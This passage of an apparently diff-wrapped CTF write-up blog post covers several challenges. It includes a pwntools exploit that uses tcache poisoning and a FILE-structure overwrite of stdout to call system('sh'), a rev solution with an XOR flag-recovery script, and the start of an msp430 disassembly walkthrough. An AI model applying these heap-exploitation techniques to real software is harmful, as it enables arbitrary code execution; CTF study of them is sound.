+<span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x558da03811c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x558da03811d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> 
+<span class="n">fd</span><span class="o">=</span><span class="mh">0x5588f8e217e1</span><span class="p">(</span><span class="o">=</span><span class="mh">0x558da0381460</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>note that our <em>2nd</em> chunk has the corrupted fd pointer. this means that we’ll need to allocate 3 chunks in order to get our chunk arbitrarily allocated.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">'[*] now getting arballoc over victim chunk fd ptr'</span><span class="p">)</span>
+
+<span class="n">target_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_leak</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x460</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span>  <span class="o">^</span> <span class="n">heap_leak</span><span class="p">))</span>
+
+<span class="n">malloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcacacacacacacaca</span> <span class="o">^</span> <span class="n">heap_leak</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] larger chunk should now be poisoned'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">31</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x5587b6a9a1b0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x5587b6a99460</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x5587b6a99450</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x5587b6a99460</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0xcacacacf92b1a053</span><span class="p">(</span><span class="o">=</span><span class="mh">0xcacacacacacacaca</span><span class="p">),</span> <span class="n">corrupted</span><span class="p">)</span>
+ <span class="o">-&gt;</span> <span class="mh">0xcacacacacacacaca</span> <span class="p">[</span><span class="n">corrupted</span> <span class="n">chunk</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>perfect! we now have big enough writes. given that we have access to such large writes, we can just do fsop and win.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">input</span><span class="p">(</span><span class="s">'[!] sanity check'</span><span class="p">)</span>
+
+<span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">'[*] chunk now claimed over stdout'</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="mh">0x00</span><span class="p">:</span> <span class="sa">b</span><span class="s">"  sh"</span><span class="p">,</span>
+ 
+    <span class="mh">0x20</span><span class="p">:</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="mh">0x28</span><span class="p">:</span> <span class="mh">0x1</span><span class="p">,</span>
+ 
+    <span class="mh">0x88</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_stdfile_1_lock</span><span class="p">,</span>
+    <span class="mh">0xa0</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_2_1_stdout_</span><span class="p">,</span>
+    <span class="mh">0xc0</span><span class="p">:</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="mh">0xd8</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_wfile_jumps</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span>
+ 
+    <span class="mh">0x18</span><span class="p">:</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="mh">0x30</span><span class="p">:</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="mh">0xe0</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_2_1_stdout_</span><span class="p">,</span>
+ 
+    <span class="mh">0x68</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>
+<span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'9'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="revsan-andreas-fault-line">rev/san andreas fault line</h3>
+
+<p>The binary isn’t hard to rev given there’s no obfuscation, any compiler anyhow dogshit whack also can. The key here is this <code class="language-plaintext highlighter-rouge">traverse()</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">traverse</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">**</span><span class="n">ptr1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">**</span><span class="n">ptr2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">**</span><span class="n">saved_ptr</span><span class="p">,</span> <span class="kt">uintptr_t</span> <span class="n">pointer_mangle</span><span class="p">,</span> <span class="n">ByteCheck</span> <span class="n">byte_chunks</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag_chunks</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="kt">int</span> <span class="n">iter</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">ptr2</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">ptr1</span><span class="p">);</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">y</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">target_addr</span> <span class="o">=</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="p">((</span><span class="n">pointer_mangle</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">flag_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">y</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x2</span> <span class="o">^</span> <span class="n">byte_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">nibbles</span><span class="p">[</span><span class="n">y</span><span class="p">]));</span>
+		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">fake_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">target_addr</span><span class="p">;</span>
+		<span class="n">fake_chunk</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31</span><span class="p">;</span>
+		<span class="o">*</span><span class="n">saved_ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">target_addr</span> <span class="o">^</span> <span class="n">pointer_mangle</span><span class="p">;</span>
+		<span class="o">*</span><span class="n">ptr1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+		<span class="o">*</span><span class="n">ptr2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+		<span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">ptr2</span><span class="p">);</span>
+		<span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">ptr1</span><span class="p">);</span>
+	<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Complicated. But anyways before that there’s two rudimentary checks that just veerify if our flag has the correct <code class="language-plaintext highlighter-rouge">CyberBlitz2025{}</code> prefix and suffix, formed by dereferencing the ptr output of <code class="language-plaintext highlighter-rouge">strstr()</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">strncpy</span><span class="p">(</span><span class="n">actual_bytes</span><span class="p">,</span> <span class="n">strstr</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s">"CyberBlitz2025{"</span><span class="p">)</span><span class="o">+</span><span class="mi">15</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">actual_bytes</span><span class="p">));</span>	
+	<span class="kt">char</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">actual_bytes</span><span class="p">,</span> <span class="s">"}"</span><span class="p">);</span>
+	<span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Hopefully this requires no explanation. Moving on to the interesting part:</p>
+
+<p>We’ll need to know some things about how <code class="language-plaintext highlighter-rouge">malloc()</code> works on the latest version of libc, 2.41 (the libc version is provided in the files distributed to the competitors, too.)</p>
+
+<p>First thing is that <code class="language-plaintext highlighter-rouge">malloc()</code> mangles the tcache ptr with a certain key. This is computed as <code class="language-plaintext highlighter-rouge">pointer_mangle</code> in the binary, so it’s already taken care of for us.</p>
+
+<p>Second thing is that <code class="language-plaintext highlighter-rouge">malloc()</code> will throw a <code class="language-plaintext highlighter-rouge">SIGABRT</code> if it tries to <code class="language-plaintext highlighter-rouge">malloc()</code> at an area that is not <code class="language-plaintext highlighter-rouge">0x10</code> aligned. This is the functionality that the entire flag-checker is based off of: the given inputs are used to manipulate tcache pointers. We go byte-by-byte, poisoning the <code class="language-plaintext highlighter-rouge">fd</code> ptrs of each chunk in our bin, and then re-<code class="language-plaintext highlighter-rouge">malloc()</code> - if our bytes are correct, the ptrs will be correctly <code class="language-plaintext highlighter-rouge">0x10</code> aligned, and we’re good. We need to do this for each byte.</p>
+
+<p>Now, the specifics as to how this actually works:</p>
+
+<p>When we free two chunks A and B, they both get sent to tcache, and chunk A is populated with an <code class="language-plaintext highlighter-rouge">fd</code> ptr that points to where <code class="language-plaintext highlighter-rouge">B</code> is. If we have an UAF, we can just alter this <code class="language-plaintext highlighter-rouge">fd</code> ptr after it’s freed, hence controlling where <code class="language-plaintext highlighter-rouge">malloc()</code> tries to allocate a chunk at. This is a basic heap pwn concept known as tcache poisoning. There’s a few kinks for this to actually work (mainly, valid chunk headers, but I take care of those in the binary already).</p>
+
+<p>You might ask: wait why does this sound like pwn and not rev. The answer is: umm uhh :3</p>
+
+<p>Anyways, we have to unpack this bitwise nonsense being performed in <code class="language-plaintext highlighter-rouge">traverse()</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">target_addr</span> <span class="o">=</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="p">((</span><span class="n">pointer_mangle</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">flag_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">y</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x2</span> <span class="o">^</span> <span class="n">byte_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">nibbles</span><span class="p">[</span><span class="n">y</span><span class="p">]));</span>
+</code></pre></div></div>
+
+<p>We can ignore <code class="language-plaintext highlighter-rouge">pointer_mangle &lt;&lt; 12</code>. <code class="language-plaintext highlighter-rouge">y</code> is iterated through from 0 to 1, and the bitshifts actually suggest to use that we’re isolating each <em>nibble</em> of the byte, xoring it with a given constant (it ranges from <code class="language-plaintext highlighter-rouge">0x2 - 0x8</code> depending on which loop we’re in) and then further xoring it with the 1st or 2nd nibble in <code class="language-plaintext highlighter-rouge">byte_chunks</code>. We know that we need this to eventually be <code class="language-plaintext highlighter-rouge">0x10</code>.</p>
+
+<p>This essentially reduces the chal to a trivial xor problem, with only one unknown (our flag byte!).</p>
+
+<p>We can just code up a simple Python script, extracting the <code class="language-plaintext highlighter-rouge">ByteCheck</code>s from our binary.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">flag_bytes</span> <span class="o">=</span> 
+<span class="p">[[</span><span class="mi">18</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">20</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">19</span><span class="p">,</span><span class="mi">30</span><span class="p">],[</span><span class="mi">29</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">30</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">21</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">25</span><span class="p">,</span><span class="mi">28</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">18</span><span class="p">,</span><span class="mi">18</span><span class="p">],[</span><span class="mi">26</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">18</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">20</span><span class="p">,</span><span class="mi">19</span><span class="p">],[</span><span class="mi">25</span><span class="p">,</span><span class="mi">19</span><span class="p">],[</span><span class="mi">28</span><span class="p">,</span><span class="mi">31</span><span class="p">],[</span><span class="mi">26</span><span class="p">,</span><span class="mi">20</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">18</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">18</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">28</span><span class="p">,</span><span class="mi">18</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">30</span><span class="p">],[</span><span class="mi">17</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">21</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">25</span><span class="p">,</span><span class="mi">27</span><span class="p">],[</span><span class="mi">17</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">23</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">21</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">24</span><span class="p">,</span><span class="mi">31</span><span class="p">],[</span><span class="mi">29</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">20</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">28</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">21</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">20</span><span class="p">,</span><span class="mi">20</span><span class="p">],[</span><span class="mi">21</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">24</span><span class="p">,</span><span class="mi">27</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">18</span><span class="p">,</span><span class="mi">18</span><span class="p">],[</span><span class="mi">26</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">17</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">16</span><span class="p">,</span><span class="mi">23</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">],[</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">18</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">29</span><span class="p">,</span><span class="mi">31</span><span class="p">],[</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">17</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">16</span><span class="p">],[</span><span class="mi">27</span><span class="p">,</span><span class="mi">27</span><span class="p">]]</span>
+
+<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">flag_bytes</span><span class="p">):</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">idx</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="mh">0x00</span>
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">nibble</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">byte</span><span class="p">):</span>
+        <span class="n">flag_nibble</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">^</span> <span class="n">offset</span> <span class="o">^</span> <span class="n">nibble</span>
+        <span class="n">flag</span> <span class="o">|=</span> <span class="n">flag_nibble</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">idx</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Done!</p>
+
+<h3 id="revthrowback">rev/throwback</h3>
+
+<p>the file is a stripped, statically linked binary for the msp430:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-<span class="o">(</span>navi<span class="s1">'s curette)-[~/venvs/msp430-nix-env/example-asm]
+[-$ file rev.bin                                 
+rev.bin: ELF 32-bit LSB executable, TI msp430, version 1 (embedded), statically linked, not stripped
+</span></code></pre></div></div>
+
+<p>you’re not gonna be able to run this on any laptop or pc you have lying around, so we’ll have to figure out how to interact with it statically.</p>
+
+<p>(orrr you can just run this through a msp430 emulator, this does just solve it automatically.)</p>
+
+<h3 id="static-reversing">static reversing</h3>
+
+<p>there’s a toolchain for the <a href="https://manpages.debian.org/unstable/binutils-msp430/msp430-objdump.1.en.html">msp430</a> with a few useful tools, but the main one here is <code class="language-plaintext highlighter-rouge">objdump</code>, which we can use to obtain clean disassembly for the binary. we definitely won’t be able to obtain anything resembling ‘clean’ decompilation - the assembly was handwritten and doesn’t decompile at all. (however, ghidra <em>is</em> able to recognize the msp430 format and give a working decomp as well. i find working with <code class="language-plaintext highlighter-rouge">msp430-elf-objdump</code>’s output a lot cleaner.)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">0000</span><span class="n">c000</span> <span class="o">&lt;</span><span class="p">.</span><span class="n">text</span><span class="o">&gt;:</span>
+    <span class="n">c000</span><span class="o">:</span>	<span class="mi">0</span><span class="n">d</span> <span class="mi">40</span>       	<span class="n">mov</span>	<span class="n">r0</span><span class="p">,</span>	<span class="n">r13</span>	<span class="p">;</span>
+    <span class="n">c002</span><span class="o">:</span>	<span class="mi">31</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mi">20</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">8192</span><span class="p">,</span>	<span class="n">r1</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x2000</span>
+    <span class="n">c006</span><span class="o">:</span>	<span class="mi">0</span><span class="n">f</span> <span class="mi">41</span>       	<span class="n">mov</span>	<span class="n">r1</span><span class="p">,</span>	<span class="n">r15</span>	<span class="p">;</span>
+    <span class="n">c008</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mi">4</span><span class="n">d</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">19712</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x4d00</span>
+    <span class="n">c00c</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c00e</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">03</span> <span class="mi">43</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">17155</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x4303</span>
+    <span class="n">c012</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c014</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mi">2</span><span class="n">b</span> <span class="mi">52</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">21035</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x522b</span>
+</code></pre></div></div>
+
+<p>looking at the assembly, we see a <em>whole</em> lot of these <code class="language-plaintext highlighter-rouge">mov</code> and <code class="language-plaintext highlighter-rouge">push</code> instructions, at least like 100 or so. but the first few instructions are just <code class="language-plaintext highlighter-rouge">mov</code>s to certain registers.</p>
+
+<p>recall that for the <code class="language-plaintext highlighter-rouge">msp430</code>, certain registers have certain special functions. the important ones for our case are:</p>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">r0</code>: program counter. tells us which instruction is being executed. note that we can perform operations on this register like any other - we can <code class="language-plaintext highlighter-rouge">mov</code> to it, which changes our entire program flow. we can also <code class="language-plaintext highlighter-rouge">add</code> / <code class="language-plaintext highlighter-rouge">sub</code> to it, which is actually just what a <code class="language-plaintext highlighter-rouge">jmp</code> instruction is a mnemonic for.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">r1</code>: stack pointer, points to the stack in memory. recall that the stack grows <em>downwards</em>, so if our stack pointer is at <code class="language-plaintext highlighter-rouge">0x2000</code>, and we push a word <code class="language-plaintext highlighter-rouge">0xcafe</code>, the stack pointer would then be <em>decreased</em> to <code class="language-plaintext highlighter-rouge">0x1ffe</code>.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">r2</code>: status register. not relevant for our purposes, won’t cover.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">r3</code><code class="language-plaintext highlighter-rouge">: constant generator. the msp430 is able to generate a few hardcoded constants _within_ their registers, such that they don't need to be loaded from memory and occupy precious space. the constants are </code>1, 2, 4, 8`.</p>
+  </li>
+</ol>
+
+<p>the rest are all general purpose registers which we can use however we want.</p>
+
+<p>inspecting the binary’s disassembly again, let’s just break it down some more:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    c000:	0d 40       	mov	r0,	r13	;
+    c002:	31 40 00 20 	mov	#8192,	r1	;#0x2000
+    c006:	0f 41       	mov	r1,	r15	;
+</code></pre></div></div>
+
+<p>so this section <em>preserves</em> the initial program counter into <code class="language-plaintext highlighter-rouge">r13</code>, and also initializes the stack pointer at a fixed point <code class="language-plaintext highlighter-rouge">0x2000</code>.</p>
+
+<p>then. there’s a <em>whole</em> lot of <code class="language-plaintext highlighter-rouge">mov _word_, r14</code> and <code class="language-plaintext highlighter-rouge">push r14</code> calls:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nl">c6de:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c6e0</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mi">24</span> <span class="mi">82</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="o">-</span><span class="mi">32220</span><span class="p">,</span><span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x8224</span>
+    <span class="n">c6e4</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c6e6</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">04</span> <span class="mi">54</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">21508</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x5404</span>
+    <span class="n">c6ea</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c6ec</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">04</span> <span class="mi">54</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">21508</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x5404</span>
+    <span class="n">c6f0</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c6f2</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">04</span> <span class="mi">54</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">21508</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x5404</span>
+    <span class="n">c6f6</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
